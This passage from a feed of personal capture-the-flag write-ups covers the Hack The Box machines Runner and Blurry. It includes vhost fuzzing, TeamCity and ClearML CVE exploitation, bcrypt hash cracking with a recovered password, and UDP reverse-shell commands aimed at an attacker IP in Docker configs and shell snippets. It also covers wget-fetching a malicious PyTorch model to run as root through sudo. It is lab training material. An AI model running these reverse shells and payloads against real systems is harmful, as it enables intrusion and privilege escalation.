<div><pre class="hljs"><code>ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u <span class="hljs-string">'http://FUZZ.runner.htb'</span> -<span class="hljs-built_in">fc</span> 302 -t 200</code></pre></div>
<p>Does not give any resoults.</p>
<h2 id="port-8000">port 8000</h2>
<p>It hosts NSCA(Nagios Service Check Acceptor) Nagios addon.<br />
<a title="https://answerhub.nagios.com/support/s/article/Using-the-NSCA-Addon-8b43111e" href="https://answerhub.nagios.com/support/s/article/Using-the-NSCA-Addon-8b43111e">https://answerhub.nagios.com/support/s/article/Using-the-NSCA-Addon-8b43111e</a><br />
<a title="https://support.nagios.com/kb/article/nsca-overview-78.html" href="https://support.nagios.com/kb/article/nsca-overview-78.html">https://support.nagios.com/kb/article/nsca-overview-78.html</a></p>
<p>It seems to be one of the products of system monitoring solutions firm.<br />
<a title="https://www.nagios.com/products/" href="https://www.nagios.com/products/">https://www.nagios.com/products/</a></p>
<p>It only recieves input from monitoring services and after further some research it seems like a dead end.</p>
<h2 id="gobuster">gobuster</h2>
<p>Running gobuster with larger n0kovo subdomains list in vhost enumeration mode finally gives us some resoults.</p>
<div><pre class="hljs"><code><span class="hljs-variable">$gobuster</span> vhost -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://runner.htb  --append-domain -t 150
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://runner.htb
[+] Method:          GET
[+] Threads:         150
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   <span class="hljs-literal">true</span>
===============================================================
Starting gobuster <span class="hljs-keyword">in</span> VHOST enumeration mode
===============================================================
Found: teamcity.runner.htb Status: 401 [Size: 66]</code></pre></div>
<h1 id="cve-2023-42793">CVE-2023-42793</h1>
<p><a title="https://www.exploit-db.com/exploits/51884" href="https://www.exploit-db.com/exploits/51884">https://www.exploit-db.com/exploits/51884</a></p>
<p><img src="/_resources/e54fcdeae2524f8792161809d787a524.png" /></p>
<p>We are finally logged in somewhere.</p>
<h1 id="teamcity">TeamCity</h1>
<p>In team city, we can create a new project with build steps. Similarly to Jenkins, this can be used for getting reverse shell.</p>
<p><img src="/_resources/46085b5b2402422c97e1abcb9f1a9472.png" /></p>
<p>or that would be the case, if we couldnt just go to the admin panel and see all users including admin.</p>
<p><img src="/_resources/d0d9a48fd91147a2bc446a7c5e65db85.png" /></p>
<p>We can also get a backup of everything…</p>
<p><img src="/_resources/50ba8c90574141069c6afe818a74a79d.png" /></p>
<p>… and instead of searching in the gui, we can just find ssh keys.</p>
<p><img src="/_resources/96c2146a19ad4bf895c7cbfb9e4e1f12.png" /></p>
<p><code>ssh -i ./id_rsa john@runner.htb</code> allows us to log in as john and get the user flag.</p>
<h1 id="priv-esc">Priv Esc</h1>
<h2 id="linenum">LinEnum</h2>
<p>LinEnum returns nothing as usually.</p>
<h2 id="portainer">Portainer</h2>
<div><pre class="hljs"><code>Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
tcp        0     76 10.129.182.43:22        10.10.14.81:42262       ESTABLISHED -                   
tcp        0      0 127.0.0.1:54050         127.0.0.1:9000          TIME_WAIT   -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      - </code></pre></div>
<div><pre class="hljs"><code>john@runner:/tmp$ ls /data
bin  certs  chisel  compose  docker_config  portainer.db  portainer.key  portainer.pub  teamcity_server  tls</code></pre></div>
<p>Using ssh tunneling <code>ssh -i ./id_rsa -L 8082:localhost:9000 john@runner.htb</code> , we can see that port 9000 is portainer, unfortunetly behind a password.</p>
<p><img src="/_resources/e535ee9c4d9d4f1e84411c8c3da591c4.png" /></p>
<p>Port 8111 is TeamCity.</p>
<p><img src="/_resources/6043489f3b5c49e8bdc8f521ab5f1280.png" /></p>
<p>In backup we can also find users file, hashed with bcrypt.</p>
<div><pre class="hljs"><code>ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
<span class="hljs-number">1</span>, admin, $2a$07$cQmbW7GA2NePss1vKY8RleSQ8kPMiU6av/N5m00mFHthv69NBBXOW, John, john<span class="hljs-symbol">@runner</span>.htb, <span class="hljs-number">1723627560076</span>, BCRYPT
<span class="hljs-number">2</span>, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew<span class="hljs-symbol">@runner</span>.htb, <span class="hljs-number">1709150421438</span>, BCRYPT
<span class="hljs-number">11</span>, city_adminq8dt, $2a$07$WJrTewhBjMRJGvEil6mxROo8RWeFimky0wPZt3pRvVgICHP61NlqG, , angry-admin<span class="hljs-symbol">@funnybunny</span>.org, <span class="hljs-number">1723628900193</span>, BCRYPT</code></pre></div>
<p>Using john we get password for matthew, which is piper123.<br />
We can use it to log into portainer.</p>
<h3 id="yaml">yaml</h3>
<p><img src="/_resources/28eeab3acf2e439ebb6ecb741ae210fe.png" /></p>
<p>In custom templates, we can create our own reverse shell template:</p>
<div><pre class="hljs"><code><span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-attr">shell_reverse:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">alpine:latest</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">shell_reverse</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">sh</span> <span class="hljs-string">-c</span> <span class="hljs-string">"sh -i &gt;&amp; /dev/udp/10.10.14.81/4242 0&gt;&amp;1"</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span></code></pre></div>
<p>But then we learn that deploying the stack is reserved for admin users.</p>
<h3 id="creating-dockerfile">Creating dockerfile</h3>
<p>We can try to create a malicious docker file and upload it manualy.</p>
<div><pre class="hljs"><code>mkdir shell_reverse
<span class="hljs-built_in">cd</span> shell_reverse
touch Dockerfile
<span class="hljs-built_in">echo</span> <span class="hljs-string">'FROM alpine:latest'</span> &gt; Dockerfile
<span class="hljs-built_in">echo</span> <span class="hljs-string">'CMD sh -c "sh -i &gt;&amp; /dev/udp/10.0.0.1/4242 0&gt;&amp;1"'</span> &gt; Dockerfile
docker build -t shell_reverse .</code></pre></div>
<p>But we cant deploy anything that is not from docker.io.</p>
<h3 id="getting-flag-with-volume">Getting flag with volume</h3>
<p>We have to create volume:</p>
<p><img src="/_resources/c9c1997e95f541ed9f638408d816d338.png" /></p>
<p>Then we have to attach it to a new container, for example teamcity.<br />
After connecting as root to the container, we can see in /mnt the root flag.</p>
<p><img src="/_resources/173419e77fb24f3ea93017505068db41.png" /></p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Blurry]]></title>
            <guid>3144715792874e24a0a57117d9c3c7e8</guid>
            <pubDate>Tue, 13 Aug 2024 09:45:32 GMT</pubDate>
            <content:encoded><![CDATA[<h1 id="recon">recon</h1>
<div><pre class="hljs"><code><span class="hljs-meta">$</span><span class="language-bash">nmap -A 10.10.11.19</span>
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 09:43 UTC
Nmap scan report for 10.10.11.19
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
<div><pre class="hljs"><code><span class="hljs-meta">$</span><span class="language-bash">ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://FUZZ.blurry.htb -<span class="hljs-built_in">fc</span> 301 -t 200</span>

files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 83ms]
app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 77ms]
chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 94ms]
:: Progress: [19966/19966] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:39] :: Errors: 2 ::</code></pre></div>
<p><img src="/_resources/75e5aecf79ac4bb593a4825c77d68192.png" /></p>
<h1 id="chata">chata</h1>
<p><img src="/_resources/53117c8aa77d4536b93af2897e54f310.png" /></p>
<p>jippity is admin.</p>
<h1 id="cve-2024-24590-clearml">CVE-2024-24590-ClearML</h1>
<p>Nist database with describtion of CVE:<br />
<a title="https://nvd.nist.gov/vuln/detail/CVE-2024-24590" href="https://nvd.nist.gov/vuln/detail/CVE-2024-24590">https://nvd.nist.gov/vuln/detail/CVE-2024-24590</a></p>
<p>Explanation:<br />
<a title="https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/" href="https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/">https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/</a></p>
<p>Ready script:<br />
<a title="https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit" href="https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit">https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit</a></p>
<p><img src="/_resources/5e2638ba1dd8489181aec5663983ddf0.png" /></p>
<p>Now we get access to the account of jippity, admin of previous chat.<br />
Thus, we have user flag.</p>
<h1 id="establishing-shell">Establishing shell</h1>
<p>To escape this buggy machine:</p>
<div><pre class="hljs"><code><span class="hljs-meta"># </span><span class="language-bash">Listener:</span>
nc -u -lvp 4242
<span class="hljs-meta">
# </span><span class="language-bash">Victim:</span>
sh -i &gt;&amp; /dev/udp/10.10.14.81/4242 0&gt;&amp;1
<span class="hljs-meta">

# </span><span class="language-bash">and <span class="hljs-keyword">then</span></span>

python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL-Z
stty raw -echo; fg</code></pre></div>
<h1 id="priv-esc">Priv Esc</h1>
<p>Running LinEnum gives us:</p>
<div><pre class="hljs"><code>[+] We can sudo without supplying a password!
Matching Defaults entries <span class="hljs-keyword">for</span> jippity on <span class="hljs-symbol">blurry:</span>
    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>

User jippity may run the following commands on <span class="hljs-symbol">blurry:</span>
    (root) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/evaluate_model /models/*.pth
[+] We can sudo without supplying a password!
Matching Defaults entries <span class="hljs-keyword">for</span> jippity on <span class="hljs-symbol">blurry:</span>
    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>

User jippity may run the following commands on <span class="hljs-symbol">blurry:</span>
    (root) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/evaluate_model /models/*.pth</code></pre></div>
<p>evaluate_model is a python script running those models and based on their output it gives them a score. It becomes obvious that we need to create a malicious .pth file and run it with this script. Fortunetly for us, someone created already a script generating .pth files running arbitrary commands.</p>
<p><a title="https://github.com/duck-sec/pytorch-evil-pth" href="https://github.com/duck-sec/pytorch-evil-pth">https://github.com/duck-sec/pytorch-evil-pth</a></p>
<div><pre class="hljs"><code><span class="hljs-meta"># </span><span class="language-bash">on host</span> 
./evil_pth.py 'cat /root/root.txt &gt;&gt; /models/flag'
http-server
<span class="hljs-meta">
# </span><span class="language-bash">on victim</span>
wget http://10.10.14.81:8080/evil_model.pth
sudo /usr/bin/evaluate_model /models/evil_model.pth
cat /models/flag</code></pre></div>
]]></content:encoded>
        </item>
    </channel>
</rss>